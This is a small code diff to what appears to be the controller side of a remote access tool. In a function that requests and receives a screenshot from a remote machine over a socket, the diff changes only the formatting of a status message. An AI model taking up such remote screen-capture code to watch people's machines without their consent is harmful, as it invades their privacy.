@@ -218,7 +218,7 @@ def user_info():
 def screenshot():
     send(str.encode("screen"))
     strScrnSize = decode_utf8(recv(intBuff))  # get screenshot size
-    print(f"Receiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
+    print(f"\nReceiving Screenshot\nFile size: {strScrnSize} bytes\nPlease wait...")
 
     intBuffer = int(strScrnSize)
 
